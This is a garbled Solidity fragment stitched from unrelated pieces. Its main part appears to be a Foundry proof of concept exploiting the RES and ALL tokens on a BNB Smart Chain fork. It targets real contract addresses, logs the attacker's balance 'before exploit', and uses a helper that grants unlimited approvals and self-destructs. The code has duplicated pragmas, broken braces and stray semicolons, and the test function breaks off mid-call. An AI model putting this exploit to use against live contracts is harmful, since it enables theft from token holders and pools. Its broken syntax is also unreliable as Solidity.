
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function destroyDataResult(string memory resultId) public {
        emit DataResultDestroyed(resultId);
    }
}
pragma solidity ^0.8.10;

;
;
interface IRES is IERC20{
    function thisAToB() external};
contract ReceiveToken{
    constructor(){
        IRES RES = IRES(0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21);
        IERC20 ALL = IERC20(0x04C0f31C0f59496cf195d2d7F1dA908152722DE7);
        RES.approve(msg.sender, type(uint).max);
        ALL.approve(msg.sender, type(uint).max);
        selfdestruct(payable(msg.sender))};
contract ContractTest is DSTest{
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IRES RES = IRES(0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21);
    IERC20 ALL = IERC20(0x04C0f31C0f59496cf195d2d7F1dA908152722DE7);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    Uni_Pair_V2 RESPair = Uni_Pair_V2(0x05ba2c512788bd95cd6D61D3109c53a14b01c82A);
    Uni_Pair_V2 ALLPair = Uni_Pair_V2(0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb);
    address dodo = 0xD7B7218D778338Ea05f5Ecce82f86D365E25dBCE;
    address dodo2 = 0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A;
    uint amount;
    uint amount2;
    address add;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    function setUp() public {
        cheats.createSelectFork("bsc", 21948016)};
    function testExploit() public payable{
        emit log_named_decimal_uint("[Start] Attacker USDT balance before exploit",
            USDT.balanceOf(address(this)),;
            18);
        address(WBNB).call{value: 30000 ether}
function replayableTransfer1(address to) public {
    payable(to).transfer(1 ether)}